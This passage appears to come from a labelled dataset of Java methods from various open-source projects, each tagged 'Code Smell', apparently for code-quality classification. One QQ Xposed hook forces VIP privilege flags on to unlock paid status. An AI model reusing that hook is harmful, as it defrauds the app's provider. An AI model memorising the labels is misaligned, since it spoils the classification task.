  DatabendAggregateFunction aggregateFunction=Randomly.fromOptions(DatabendAggregateFunction.MAX,DatabendAggregateFunction.MIN,DatabendAggregateFunction.SUM,DatabendAggregateFunction.COUNT,DatabendAggregateFunction.AVG);
  NewFunctionNode<DatabendExpression,DatabendAggregateFunction> aggregate=(DatabendAggregateOperation)gen.generateArgsForAggregate(aggregateFunction);
  List<Node<DatabendExpression>> fetchColumns=new ArrayList<>();
  fetchColumns.add(aggregate);
  while (Randomly.getBooleanWithRatherLowProbability()) {
    fetchColumns.add((DatabendAggregateOperation)gen.generateAggregate());
  }
  select.setFetchColumns(Arrays.asList(aggregate));
  originalQuery=DatabendToStringVisitor.asString(select);
  firstResult=getAggregateResult(originalQuery);
  metamorphicQuery=createMetamorphicUnionQuery(select,aggregate,select.getFromList());
  secondResult=getAggregateResult(metamorphicQuery);
  state.getState().getLocalState().log(""--"" + originalQuery + "";\n--""+ metamorphicQuery+ ""\n-- ""+ firstResult+ ""\n-- ""+ secondResult);
  if (firstResult == null && secondResult != null || firstResult != null && (!firstResult.contentEquals(secondResult) && !ComparatorHelper.isEqualDouble(firstResult,secondResult))) {
    if (secondResult.contains(""Inf"")) {
      throw new IgnoreMeException();
    }
    throw new AssertionError();
  }
}
",1,Code Smell
"public JdbcBatchingOutputFormat<RowData,?,?> build(){
  checkNotNull(jdbcOptions,""jdbc options can not be null"");
  checkNotNull(dmlOptions,""jdbc dml options can not be null"");
  checkNotNull(executionOptions,""jdbc execution options can not be null"");
  final LogicalType[] logicalTypes=Arrays.stream(fieldDataTypes).map(DataType::getLogicalType).toArray(LogicalType[]::new);
  if (dmlOptions.getKeyFields().isPresent() && dmlOptions.getKeyFields().get().length > 0 && !appendMode) {
    return new JdbcBatchingOutputFormat<>(new SimpleJdbcConnectionProvider(jdbcOptions),executionOptions,ctx -> createBufferReduceExecutor(dmlOptions,ctx,rowDataTypeInformation,logicalTypes),JdbcBatchingOutputFormat.RecordExtractor.identity(),inlongMetric,auditHostAndPorts,dirtyOptions,dirtySink,auditKeys);
  }
 else {
    final String sql=dmlOptions.getDialect().getInsertIntoStatement(dmlOptions.getTableName(),dmlOptions.getFieldNames());
    return new JdbcBatchingOutputFormat<>(new SimpleJdbcConnectionProvider(jdbcOptions),executionOptions,ctx -> createSimpleBufferedExecutor(ctx,dmlOptions.getDialect(),dmlOptions.getFieldNames(),logicalTypes,sql,rowDataTypeInformation),JdbcBatchingOutputFormat.RecordExtractor.identity(),inlongMetric,auditHostAndPorts,dirtyOptions,dirtySink,auditKeys);
  }
}",1,Code Smell
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof Shop)) {
    return false;
  }
  Shop other=(Shop)o;
  return bitField0_ == other.bitField0_ && (!hasBeginTime() || beginTime == other.beginTime) && (!hasEndTime() || endTime == other.endTime) && (!hasCityTakenLevelReward() || cityTakenLevelReward == other.cityTakenLevelReward) && (!hasShopId() || shopId == other.shopId) && (!hasCityExp() || cityExp == other.cityExp) && (!hasCityLevel() || cityLevel == other.cityLevel) && (!hasGoodsList() || goodsList.equals(other.goodsList));
}",1,Code Smell
"private static List<BeanElement> buildElementList(Class clz,List<BeanElement> filterList,Map<String,Field> allMap){
  List<BeanElement> list=new ArrayList<BeanElement>();
  for (  BeanElement element : filterList) {
    parseAnno(clz,element,allMap.get(element.getProperty()));
    Class ec=element.getClz();
    if (element.getSqlType() == null) {
      if (ec == long.class || ec == Long.class) {
        element.setSqlType(SqlFieldType.LONG);
        element.setLength(13);
      }
 else       if (ec == int.class || ec == Integer.class) {
        element.setSqlType(SqlFieldType.INT);
        element.setLength(11);
      }
 else       if (ec == BigInteger.class) {
        element.setSqlType(SqlFieldType.BIG_INTEGER);
        element.setLength(20);
      }
 else       if (ec == double.class || ec == Double.class) {
        element.setSqlType(SqlFieldType.DOUBLE);
        element.setLength(13);
      }
 else       if (ec == float.class || ec == Float.class) {
        element.setSqlType(SqlFieldType.FLOAT);
        element.setLength(13);
      }
 else       if (ec == boolean.class || ec == Boolean.class) {
        element.setSqlType(SqlFieldType.BYTE);
        element.setLength(1);
      }
 else       if (ec == String.class) {
        element.setSqlType(SqlFieldType.VARCHAR);
        if (element.getLength() == 0)         element.setLength(60);
      }
 else       if (ec == BigDecimal.class) {
        element.setSqlType(SqlFieldType.DECIMAL);
      }
 else       if (ec == LocalDateTime.class || ec == LocalDate.class || ec == Date.class || ec == java.sql.Date.class || ec == Timestamp.class) {
        element.setSqlType(SqlFieldType.DATE);
      }
 else       if (EnumUtil.isEnum(ec)) {
        element.setSqlType(SqlFieldType.VARCHAR);
        if (element.getLength() == 0)         element.setLength(20);
      }
 else {
        element.setJson(true);
        if (ec == List.class) {
          Field field=null;
          try {
            field=clz.getDeclaredField(element.getProperty());
          }
 catch (          Exception e) {
            e.printStackTrace();
          }
          ParameterizedType pt=(ParameterizedType)field.getGenericType();
          Class geneType=(Class)pt.getActualTypeArguments()[0];
          element.setGeneType(geneType);
        }
        element.setSqlType(SqlFieldType.VARCHAR);
        if (element.getLength() == 0)         element.setLength(512);
      }
    }
 else     if (element.getSqlType().contains(SqlFieldType.TEXT)) {
      element.setLength(0);
    }
 else {
      element.setSqlType(SqlFieldType.VARCHAR);
    }
    list.add(element);
  }
  return list;
}",1,Code Smell
"/** 
 * Test that JWK list contains a key with the same id as the kid in the JWT header
 */
@Test public void testThatJWKListContainsValidKeyForCreatedJWT() throws Exception {
  String[] args={""../""};
  TestingProcessManager.TestingProcess process=TestingProcessManager.start(args);
  assertNotNull(process.checkOrWaitForEvent(ProcessState.PROCESS_STATE.STARTED));
  String algorithm=""RS256"";
  JsonObject payload=new JsonObject();
  payload.addProperty(""customClaim"",""customValue"");
  String jwksDomain=""http://localhost"";
  long validity=3600;
  String jwt=JWTSigningFunctions.createJWTToken(process.getProcess(),algorithm,payload,jwksDomain,validity,false);
  DecodedJWT decodedJWT=JWT.decode(jwt);
  String headerKeyId=decodedJWT.getHeaderClaim(""kid"").asString();
  boolean didFindKey=false;
  List<JsonObject> keysFromStorage=SigningKeys.getInstance(process.getProcess()).getJWKS();
  for (int i=0; i < keysFromStorage.size(); i++) {
    JsonObject key=keysFromStorage.get(i);
    if (key.get(""kid"").getAsString().equals(headerKeyId) && key.get(""kty"").getAsString().equalsIgnoreCase(""rsa"") && key.get(""alg"").getAsString().equalsIgnoreCase(""rs256"")) {
      didFindKey=true;
      break;
    }
  }
  assert didFindKey;
  process.kill();
  assertNotNull(process.checkOrWaitForEvent(ProcessState.PROCESS_STATE.STOPPED));
}",1,Code Smell
"public static ArrayList<TLRPC.TL_businessWeeklyOpen> adaptWeeklyOpen(ArrayList<TLRPC.TL_businessWeeklyOpen> hours,int utc_offset){
  ArrayList<TLRPC.TL_businessWeeklyOpen> array=new ArrayList<>(hours);
  ArrayList<TLRPC.TL_businessWeeklyOpen> array2=new ArrayList<>(array.size());
  for (int i=0; i < array.size(); ++i) {
    TLRPC.TL_businessWeeklyOpen weekly=array.get(i);
    TLRPC.TL_businessWeeklyOpen newWeekly=new TLRPC.TL_businessWeeklyOpen();
    if (utc_offset != 0) {
      int start=weekly.start_minute % (24 * 60);
      int end=start + (weekly.end_minute - weekly.start_minute);
      if (start == 0 && (end == 24 * 60 || end == 24 * 60 - 1)) {
        newWeekly.start_minute=weekly.start_minute;
        newWeekly.end_minute=weekly.end_minute;
        array2.add(newWeekly);
        continue;
      }
    }
    newWeekly.start_minute=weekly.start_minute + utc_offset;
    newWeekly.end_minute=weekly.end_minute + utc_offset;
    array2.add(newWeekly);
    if (newWeekly.start_minute < 0) {
      if (newWeekly.end_minute < 0) {
        newWeekly.start_minute+=24 * 7 * 60;
        newWeekly.end_minute+=24 * 7 * 60;
      }
 else {
        newWeekly.start_minute=0;
        newWeekly=new TLRPC.TL_businessWeeklyOpen();
        newWeekly.start_minute=24 * 7 * 60 + weekly.start_minute + utc_offset;
        newWeekly.end_minute=(24 * 7 * 60 - 1);
        array2.add(newWeekly);
      }
    }
 else     if (newWeekly.end_minute > 24 * 7 * 60) {
      if (newWeekly.start_minute > 24 * 7 * 60) {
        newWeekly.start_minute-=24 * 7 * 60;
        newWeekly.end_minute-=24 * 7 * 60;
      }
 else {
        newWeekly.end_minute=24 * 7 * 60 - 1;
        newWeekly=new TLRPC.TL_businessWeeklyOpen();
        newWeekly.start_minute=0;
        newWeekly.end_minute=weekly.end_minute + utc_offset - (24 * 7 * 60 - 1);
        array2.add(newWeekly);
      }
    }
  }
  Collections.sort(array2,(a,b) -> a.start_minute - b.start_minute);
  return array2;
}",1,Code Smell
"public static void createBlockDialogAlert(BaseFragment fragment,int count,boolean reportSpam,TLRPC.User user,BlockDialogCallback onProcessRunnable){
  if (fragment == null || fragment.getParentActivity() == null || count == 1 && user == null) {
    return;
  }
  Context context=fragment.getParentActivity();
  AlertDialog.Builder builder=new AlertDialog.Builder(context);
  CheckBoxCell[] cell=new CheckBoxCell[2];
  LinearLayout linearLayout=new LinearLayout(context);
  linearLayout.setOrientation(LinearLayout.VERTICAL);
  builder.setView(linearLayout);
  String actionText;
  if (count == 1) {
    String name=ContactsController.formatName(user.first_name,user.last_name);
    builder.setTitle(LocaleController.formatString(""BlockUserTitle"",R.string.BlockUserTitle,name));
    actionText=LocaleController.getString(""BlockUser"",R.string.BlockUser);
    builder.setMessage(AndroidUtilities.replaceTags(LocaleController.formatString(""BlockUserMessage"",R.string.BlockUserMessage,name)));
  }
 else {
    builder.setTitle(LocaleController.formatString(""BlockUserTitle"",R.string.BlockUserTitle,LocaleController.formatPluralString(""UsersCountTitle"",count)));
    actionText=LocaleController.getString(""BlockUsers"",R.string.BlockUsers);
    builder.setMessage(AndroidUtilities.replaceTags(LocaleController.formatString(""BlockUsersMessage"",R.string.BlockUsersMessage,LocaleController.formatPluralString(""UsersCount"",count))));
  }
  final boolean[] checks=new boolean[]{true,true};
  for (int a=0; a < cell.length; a++) {
    if (a == 0 && !reportSpam) {
      continue;
    }
    int num=a;
    cell[a]=new CheckBoxCell(context,1);
    cell[a].setBackgroundDrawable(Theme.getSelectorDrawable(false));
    if (a == 0) {
      cell[a].setText(LocaleController.getString(""ReportSpamTitle"",R.string.ReportSpamTitle),"""",true,false);
    }
 else {
      cell[a].setText(count == 1 ? LocaleController.getString(""DeleteThisChatBothSides"",R.string.DeleteThisChatBothSides) : LocaleController.getString(""DeleteTheseChatsBothSides"",R.string.DeleteTheseChatsBothSides),"""",true,false);
    }
    cell[a].setPadding(LocaleController.isRTL ? dp(16) : dp(8),0,LocaleController.isRTL ? dp(8) : dp(16),0);
    linearLayout.addView(cell[a],LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT,48));
    cell[a].setOnClickListener(v -> {
      CheckBoxCell cell1=(CheckBoxCell)v;
      checks[num]=!checks[num];
      cell1.setChecked(checks[num],true);
    }
);
  }
  builder.setPositiveButton(actionText,(dialogInterface,i) -> onProcessRunnable.run(checks[0],checks[1]));
  builder.setNegativeButton(LocaleController.getString(""Cancel"",R.string.Cancel),null);
  AlertDialog alertDialog=builder.create();
  fragment.showDialog(alertDialog);
  TextView button=(TextView)alertDialog.getButton(DialogInterface.BUTTON_POSITIVE);
  if (button != null) {
    button.setTextColor(Theme.getColor(Theme.key_text_RedBold));
  }
}",1,Code Smell
"private void processDone(boolean fingerprint){
  if (!fingerprint) {
    if (SharedConfig.passcodeRetryInMs > 0) {
      return;
    }
    String password="""";
    if (SharedConfig.passcodeType == SharedConfig.PASSCODE_TYPE_PIN) {
      password=passwordEditText2.getString();
    }
 else     if (SharedConfig.passcodeType == SharedConfig.PASSCODE_TYPE_PASSWORD) {
      password=passwordEditText.getText().toString();
    }
    if (password.length() == 0) {
      onPasscodeError();
      return;
    }
    if (!SharedConfig.checkPasscode(password)) {
      SharedConfig.increaseBadPasscodeTries();
      if (SharedConfig.passcodeRetryInMs > 0) {
        checkRetryTextView();
      }
      passwordEditText.setText("""");
      passwordEditText2.eraseAllCharacters(true);
      onPasscodeError();
      if (backgroundDrawable instanceof MotionBackgroundDrawable) {
        MotionBackgroundDrawable motionBackgroundDrawable=(MotionBackgroundDrawable)backgroundDrawable;
        if (backgroundAnimationSpring != null) {
          backgroundAnimationSpring.cancel();
          motionBackgroundDrawable.setPosAnimationProgress(1f);
        }
        if (motionBackgroundDrawable.getPosAnimationProgress() >= 1f) {
          motionBackgroundDrawable.rotatePreview(true);
        }
      }
      return;
    }
  }
  SharedConfig.badPasscodeTries=0;
  passwordEditText.clearFocus();
  AndroidUtilities.hideKeyboard(passwordEditText);
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && FingerprintController.isKeyReady() && FingerprintController.checkDeviceFingerprintsChanged()) {
    FingerprintController.deleteInvalidKey();
  }
  SharedConfig.appLocked=false;
  SharedConfig.saveConfig();
  NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.didSetPasscode);
  setOnTouchListener(null);
  if (delegate != null) {
    delegate.didAcceptedPassword(this);
  }
  AndroidUtilities.runOnUIThread(() -> {
    AnimatorSet AnimatorSet=new AnimatorSet();
    AnimatorSet.setDuration(200);
    AnimatorSet.playTogether(ObjectAnimator.ofFloat(this,View.TRANSLATION_Y,AndroidUtilities.dp(20)),ObjectAnimator.ofFloat(this,View.ALPHA,AndroidUtilities.dp(0.0f)));
    AnimatorSet.addListener(new AnimatorListenerAdapter(){
      @Override public void onAnimationEnd(      Animator animation){
        setVisibility(View.GONE);
      }
    }
);
    AnimatorSet.start();
  }
);
}",1,Code Smell
"@Override protected boolean initOnce() throws Exception {
  XposedHelpers.findAndHookMethod(Bitmap.class,""compress"",Bitmap.CompressFormat.class,int.class,OutputStream.class,new XC_MethodHook(){
    @Override protected void beforeHookedMethod(    MethodHookParam param){
      String currentCallStacks=getCurrentCallStacks();
      if (currentCallStacks.contains(""NearbyPeoplePhotoUploadProcessor"") || currentCallStacks.contains(""doInBackground"") || currentCallStacks.contains(""TroopUploadingThread"")) {
        param.args[0]=Bitmap.CompressFormat.PNG;
      }
    }
  }
);
  var methodName=HostInfo.requireMinQQVersion(QQVersion.QQ_8_8_93) ? ""i"" : ""a"";
  var clazzName=HostInfo.requireMinQQVersion(QQVersion.QQ_8_9_0) ? ""com.tencent.mobileqq.pic.compress.e"" : ""com.tencent.mobileqq.pic.compress.Utils"";
  Method hookMethod=Reflex.findMethod(Initiator.loadClass(clazzName),boolean.class,methodName,String.class,Bitmap.class,int.class,String.class,Initiator.loadClass(""com.tencent.mobileqq.pic.CompressInfo""));
  HookUtils.hookBeforeAlways(this,hookMethod,param -> {
    FileOutputStream fos=new FileOutputStream((String)param.args[0]);
    Bitmap bitmap=(Bitmap)param.args[1];
    bitmap.compress(Bitmap.CompressFormat.PNG,100,fos);
    fos.close();
    param.setResult(true);
  }
);
  Method med=Objects.requireNonNull(DexKit.loadMethodFromCache(NVipUtils_getPrivilegeFlags.INSTANCE),""VipStatusManagerImpl"");
  HookUtils.hookAfterAlways(this,med,param -> {
    int i=(int)param.getResult();
    param.setResult(i | 2 | 4| 8);
  }
);
  return true;
}",1,Code Smell
"@NonNull public String[] listMmkvConfig(){
  checkState();
  File[] mmkvConfigListFiles=mmkvBaseDir.listFiles();
  if (mmkvConfigListFiles == null) {
    return new String[0];
  }
 else {
    List<String> mmkvConfigList=new ArrayList<>();
    for (    File mmkvConfigListFile : mmkvConfigListFiles) {
      if (!mmkvConfigListFile.isDirectory()) {
        String name=mmkvConfigListFile.getName();
        if (!name.endsWith("".crc"") && !name.endsWith("".zip"") && new File(mmkvConfigListFile.getAbsolutePath() + "".crc"").exists()) {
          mmkvConfigList.add(name);
        }
      }
    }
    return mmkvConfigList.toArray(new String[0]);
  }
}",1,Code Smell
"private List<UtxoSelector> getUtxoSelectors(List<Payment> payments) throws InvalidAddressException {
  if (utxoSelectorProperty.get() != null) {
    return List.of(utxoSelectorProperty.get());
  }
  Wallet wallet=getWalletForm().getWallet();
  long noInputsFee=wallet.getNoInputsFee(getPayments(),getUserFeeRate());
  long costOfChange=wallet.getCostOfChange(getUserFeeRate(),getMinimumFeeRate());
  List<UtxoSelector> selectors=new ArrayList<>();
  OptimizationStrategy optimizationStrategy=(OptimizationStrategy)optimizationToggleGroup.getSelectedToggle().getUserData();
  if (optimizationStrategy == OptimizationStrategy.PRIVACY && payments.size() == 1 && (payments.get(0).getAddress().getScriptType() == getWalletForm().getWallet().getFreshNode(KeyPurpose.RECEIVE).getAddress().getScriptType())) {
    selectors.add(new StonewallUtxoSelector(payments.get(0).getAddress().getScriptType(),noInputsFee));
  }
  selectors.addAll(List.of(new BnBUtxoSelector(noInputsFee,costOfChange),new KnapsackUtxoSelector(noInputsFee)));
  return selectors;
}",1,Code Smell
"@Override public J visitMethodInvocation(J.MethodInvocation method,Integer integer){
  if ((loc.equals(METHOD_INVOCATION_ARGUMENTS) || loc.equals(METHOD_INVOCATION_NAME)) && method.isScope(insertionPoint)) {
    J.MethodInvocation m;
    if (loc.equals(METHOD_INVOCATION_ARGUMENTS)) {
      m=substitutions.unsubstitute(templateParser.parseMethodArguments(getCursor(),substitutedTemplate,loc));
      m=autoFormat(m,0);
      m=method.withArguments(m.getArguments()).withMethodType(m.getMethodType());
    }
 else {
      m=substitutions.unsubstitute(templateParser.parseMethod(getCursor(),substitutedTemplate,loc));
      m=autoFormat(m,0);
      m=method.withName(m.getName()).withArguments(m.getArguments()).withMethodType(m.getMethodType());
    }
    JavaType.Method mt=method.getMethodType();
    if (m.getMethodType() == null && mt != null) {
      List<JavaType> argTypes=m.getArguments().stream().map(Expression::getType).map(it -> {
        if (it == JavaType.Primitive.String) {
          return JavaType.ShallowClass.build(""java.lang.String"");
        }
        return it;
      }
).collect(toList());
      mt=mt.withParameterTypes(argTypes);
      m=m.withMethodType(mt);
    }
    if (m.getName().getType() != null) {
      m=m.withName(m.getName().withType(m.getType()));
    }
    return m;
  }
  return maybeReplaceStatement(method,J.class,0);
}",1,Code Smell
"@Override public BrokerProcessResult delBrokerConfInfo(String operator,boolean rsvData,int brokerId,StringBuilder strBuff,ProcessResult result){
  if (!metaConfigMapper.checkStoreStatus(true,result)) {
    return new BrokerProcessResult(brokerId,"""",result);
  }
  BrokerConfEntity curEntry=metaConfigMapper.getBrokerConfByBrokerId(brokerId);
  if (curEntry == null) {
    result.setFullInfo(true,DataOpErrCode.DERR_SUCCESS.getCode(),DataOpErrCode.DERR_SUCCESS.getDescription());
    return new BrokerProcessResult(brokerId,"""",result);
  }
  if (curEntry.getManageStatus().isOnlineStatus()) {
    result.setFailResult(DataOpErrCode.DERR_ILLEGAL_STATUS.getCode(),""Broker manage status is online, please offline first!"");
    return new BrokerProcessResult(brokerId,curEntry.getBrokerIp(),result);
  }
  BrokerRunManager brokerRunManager=tMaster.getBrokerRunManager();
  BrokerRunStatusInfo runStatusInfo=brokerRunManager.getBrokerRunStatusInfo(brokerId);
  if (runStatusInfo != null && curEntry.getManageStatus() == ManageStatus.STATUS_MANAGE_OFFLINE && runStatusInfo.inProcessingStatus()) {
    result.setFailResult(DataOpErrCode.DERR_ILLEGAL_STATUS.getCode(),strBuff.append(""Illegal value: the broker is processing offline event by brokerId="").append(brokerId).append("", please offline first and try later!"").toString());
    strBuff.delete(0,strBuff.length());
    return new BrokerProcessResult(brokerId,curEntry.getBrokerIp(),result);
  }
  if (metaConfigMapper.delBrokerConfInfo(operator,brokerId,rsvData,strBuff,result)) {
    brokerRunManager.delBrokerStaticInfo(brokerId);
    if (runStatusInfo != null) {
      brokerRunManager.releaseBrokerRunInfo(brokerId,runStatusInfo.getCreateId(),false);
    }
  }
  return new BrokerProcessResult(brokerId,curEntry.getBrokerIp(),result);
}",1,Code Smell
"/** 
 * 鎵弿PoC-T涓殑poc鑴氭湰銆侱:\github\POC-T\script
 * @param dir
 * @return
 */
public IndexedLinkedHashMap<String,LineEntry> scanPoCFiles(String dir){
  IndexedLinkedHashMap<String,LineEntry> lineEntries=new IndexedLinkedHashMap<String,LineEntry>();
  if (null == dir || !new File(dir).exists()) {
    return lineEntries;
  }
  Collection<File> files=FileUtils.listFiles(new File(dir),FileFilterUtils.suffixFileFilter("".py""),DirectoryFileFilter.INSTANCE);
  for (  File file : files) {
    if (file.exists() && file.isFile() && !file.getName().startsWith(""__"")) {
      LineEntry entry=PoctParser.Parser(file.toString());
      lineEntries.put(file.toString(),entry);
    }
  }
  return lineEntries;
}
",1,Code Smell
"@Override public void updateAppCollectJob(Job job){
  List<Monitor> monitors=monitorDao.findMonitorsByAppEquals(job.getApp()).stream().filter(monitor -> monitor.getStatus() != CommonConstants.UN_MANAGE_CODE).toList();
  if (monitors.isEmpty()) {
    return;
  }
  List<CollectorMonitorBind> monitorBinds=collectorMonitorBindDao.findCollectorMonitorBindsByMonitorIdIn(monitors.stream().map(Monitor::getId).collect(Collectors.toSet()));
  Map<Long,String> monitorIdCollectorMap=monitorBinds.stream().collect(Collectors.toMap(CollectorMonitorBind::getMonitorId,CollectorMonitorBind::getCollector));
  for (  Monitor monitor : monitors) {
    try {
      Job appDefine=job.clone();
      if (monitor == null || appDefine == null || monitor.getId() == null || monitor.getJobId() == null) {
        log.error(""update monitor job error when template modify, define | id | jobId is null. continue"");
        continue;
      }
      if (CommonConstants.PROMETHEUS.equals(monitor.getApp())) {
        appDefine.setApp(CommonConstants.PROMETHEUS_APP_PREFIX + monitor.getName());
      }
      appDefine.setId(monitor.getJobId());
      appDefine.setMonitorId(monitor.getId());
      appDefine.setInterval(monitor.getIntervals());
      appDefine.setCyclic(true);
      appDefine.setTimestamp(System.currentTimeMillis());
      List<Param> params=paramDao.findParamsByMonitorId(monitor.getId());
      List<Configmap> configmaps=params.stream().map(param -> new Configmap(param.getField(),param.getParamValue(),param.getType())).collect(Collectors.toList());
      List<ParamDefine> paramDefaultValue=appDefine.getParams().stream().filter(item -> StringUtils.hasText(item.getDefaultValue())).toList();
      paramDefaultValue.forEach(defaultVar -> {
        if (configmaps.stream().noneMatch(item -> item.getKey().equals(defaultVar.getField()))) {
          Configmap configmap=new Configmap(defaultVar.getField(),defaultVar.getDefaultValue(),(byte)1);
          configmaps.add(configmap);
        }
      }
);
      appDefine.setConfigmap(configmaps);
      String collector=monitorIdCollectorMap.get(monitor.getId());
      long newJobId=collectJobScheduling.updateAsyncCollectJob(appDefine,collector);
      monitor.setJobId(newJobId);
      monitorDao.save(monitor);
    }
 catch (    Exception e) {
      log.error(""update monitor job error when template modify: {}.continue"",e.getMessage(),e);
    }
  }
}",1,Code Smell
"public void fetchEmojiStatuses(int type,boolean cache){
  if (emojiStatusesFetching[type]) {
    return;
  }
  emojiStatusesFetching[type]=true;
  if (cache) {
    getMessagesStorage().getStorageQueue().postRunnable(() -> {
      boolean done=false;
      try {
        SQLiteCursor cursor=getMessagesStorage().getDatabase().queryFinalized(""SELECT data FROM emoji_statuses WHERE type = "" + type + "" LIMIT 1"");
        if (cursor.next() && cursor.getColumnCount() > 0 && !cursor.isNull(0)) {
          NativeByteBuffer data=cursor.byteBufferValue(0);
          if (data != null) {
            TLRPC.account_EmojiStatuses response=TLRPC.account_EmojiStatuses.TLdeserialize(data,data.readInt32(false),false);
            if (response instanceof TLRPC.TL_account_emojiStatuses) {
              emojiStatusesHash[type]=response.hash;
              emojiStatuses[type]=response.statuses;
              done=true;
            }
            data.reuse();
          }
        }
        cursor.dispose();
      }
 catch (      Exception e) {
        FileLog.e(e);
      }
      emojiStatusesFromCacheFetched[type]=true;
      emojiStatusesFetching[type]=false;
      if (done) {
        AndroidUtilities.runOnUIThread(() -> {
          getNotificationCenter().postNotificationName(NotificationCenter.recentEmojiStatusesUpdate);
        }
);
      }
 else {
        fetchEmojiStatuses(type,false);
      }
    }
);
  }
 else {
    TLObject req;
    if (type == 0) {
      TLRPC.TL_account_getRecentEmojiStatuses recentReq=new TLRPC.TL_account_getRecentEmojiStatuses();
      recentReq.hash=emojiStatusesHash[type];
      req=recentReq;
    }
 else     if (type == 1) {
      TLRPC.TL_account_getDefaultEmojiStatuses defaultReq=new TLRPC.TL_account_getDefaultEmojiStatuses();
      defaultReq.hash=emojiStatusesHash[type];
      req=defaultReq;
    }
 else {
      TLRPC.TL_account_getChannelDefaultEmojiStatuses defaultReq=new TLRPC.TL_account_getChannelDefaultEmojiStatuses();
      defaultReq.hash=emojiStatusesHash[type];
      req=defaultReq;
    }
    ConnectionsManager.getInstance(currentAccount).sendRequest(req,(res,err) -> {
      emojiStatusesFetchDate[type]=System.currentTimeMillis() / 1000;
      if (res instanceof TLRPC.TL_account_emojiStatusesNotModified) {
        emojiStatusesFetching[type]=false;
      }
 else       if (res instanceof TLRPC.TL_account_emojiStatuses) {
        TLRPC.TL_account_emojiStatuses response=(TLRPC.TL_account_emojiStatuses)res;
        emojiStatusesHash[type]=response.hash;
        emojiStatuses[type]=response.statuses;
        updateEmojiStatuses(type,response);
        AndroidUtilities.runOnUIThread(() -> {
          getNotificationCenter().postNotificationName(NotificationCenter.recentEmojiStatusesUpdate);
        }
);
      }
    }
);
  }
}",1,Code Smell
"private void prepare(final Runnable runnable){
  if (drawTask == null) {
    drawTask=createDrawTask(mDanmakuView.isDanmakuDrawingCacheEnabled(),timer,mDanmakuView.getContext(),mDanmakuView.getViewWidth(),mDanmakuView.getViewHeight(),mDanmakuView.isHardwareAccelerated(),new com.sunnyweather.android.flame.master.flame.danmaku.controller.IDrawTask.TaskListener(){
      @Override public void ready(){
        initRenderingConfigs();
        runnable.run();
      }
      @Override public void onDanmakuAdd(      BaseDanmaku danmaku){
        if (danmaku.isTimeOut()) {
          return;
        }
        long delay=danmaku.getActualTime() - getCurrentTime();
        if (delay < mContext.mDanmakuFactory.MAX_DANMAKU_DURATION && (mInWaitingState || mRenderingState.nothingRendered)) {
          notifyRendering();
        }
 else         if (delay > 0 && delay <= mContext.mDanmakuFactory.MAX_DANMAKU_DURATION) {
          sendEmptyMessageDelayed(NOTIFY_RENDERING,delay);
        }
      }
      @Override public void onDanmakuShown(      BaseDanmaku danmaku){
        if (mCallback != null) {
          mCallback.danmakuShown(danmaku);
        }
      }
      @Override public void onDanmakusDrawingFinished(){
        if (mCallback != null) {
          mCallback.drawingFinished();
        }
      }
      @Override public void onDanmakuConfigChanged(){
        redrawIfNeeded();
      }
    }
);
  }
 else {
    runnable.run();
  }
}
public void prepare(){
  mReady=false;
  if (Build.VERSION.SDK_INT < 16 && mContext.updateMethod == 0) {
    mContext.updateMethod=2;
  }
  if (mContext.updateMethod == 0) {
    mFrameCallback=new FrameCallback();
  }
  mUpdateInSeparateThread=(mContext.updateMethod == 1);
  sendEmptyMessage(DrawHandler.PREPARE);
}",1,Code Smell
"private void showShareAlert(ArrayList<MessageObject> messages){
  final FrameLayout photoContainerView=containerView;
  requestAdjustToNothing();
  boolean openKeyboardOnShareAlertClose=false;
  if (parentChatActivity != null && parentChatActivity.getChatActivityEnterView() != null && parentChatActivity.getFragmentView() != null) {
    boolean keyboardVisible=parentChatActivity.getChatActivityEnterView().isKeyboardVisible();
    if (keyboardVisible) {
      parentChatActivity.getChatActivityEnterView().showEmojiView();
      openKeyboardOnShareAlertClose=true;
    }
    AndroidUtilities.setAdjustResizeToNothing(parentChatActivity.getParentActivity(),classGuid);
    parentChatActivity.getFragmentView().requestLayout();
  }
  final boolean finalOpenKeyboardOnShareAlertClose=openKeyboardOnShareAlertClose;
  ShareAlert alert=new ShareAlert(parentActivity,parentChatActivity,messages,null,null,false,null,null,false,true,null){
    @Override protected void onSend(    LongSparseArray<TLRPC.Dialog> dids,    int count,    TLRPC.TL_forumTopic topic){
      AndroidUtilities.runOnUIThread(() -> {
        BulletinFactory.createForwardedBulletin(parentActivity,photoContainerView,dids.size(),dids.size() == 1 ? dids.valueAt(0).id : 0,count,0xf9222222,0xffffffff).show();
      }
,250);
    }
    @Override public void dismissInternal(){
      super.dismissInternal();
      if (finalOpenKeyboardOnShareAlertClose) {
        AndroidUtilities.runOnUIThread(() -> {
          if (parentChatActivity != null && parentChatActivity.getChatActivityEnterView() != null) {
            parentChatActivity.getChatActivityEnterView().openKeyboard();
          }
        }
,50);
      }
      requestAdjust();
    }
  }
;
  alert.setFocusable(false);
  alert.getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_ADJUST_NOTHING);
  AndroidUtilities.runOnUIThread(() -> {
    if (alert != null && alert.getWindow() != null) {
      alert.setFocusable(true);
      if (parentChatActivity != null && parentChatActivity.getChatActivityEnterView() != null) {
        parentChatActivity.getChatActivityEnterView().hidePopup(false);
      }
    }
  }
,AdjustPanLayoutHelper.keyboardDuration);
  alert.show();
}",1,Code Smell
"private void paintClickView(Graphics2D graphics2D){
  graphics2D.scale(mScaleRatio,mScaleRatio);
  if (mScaleRatio > 1) {
    graphics2D.translate(mTransX,mTransY);
  }
  drawScreenImage(graphics2D);
  drawClickView(graphics2D,mClickedView,0);
  if (mCurrentMode != SearchableJTree.MODE_SHIFT && mCurrentMouseX > -1 && mCurrentMouseY > -1) {
    if (mScaleRatio > 1) {
      graphics2D.translate(-mTransX,-mTransY);
    }
    graphics2D.scale(1 / mScaleRatio,1 / mScaleRatio);
    int phoneX=Math.max(CoordinateUtils.convertPanelXToPhoneX(mApplication,mCurrentMouseX,mScaleRatio,mTransX),0);
    int phoneY=Math.max(CoordinateUtils.convertPanelYToPhoneY(mApplication,mCurrentMouseY,mScaleRatio,mTransY),0);
    String paintText=""X: "" + phoneX + "", Y: ""+ phoneY;
    final int width=graphics2D.getFontMetrics().stringWidth(paintText) + 12;
    graphics2D.setColor(mTextBgColor);
    graphics2D.fillRect(0,0,width,20);
    graphics2D.setColor(mNormalTextColor);
    graphics2D.drawString(paintText,6,15);
  }
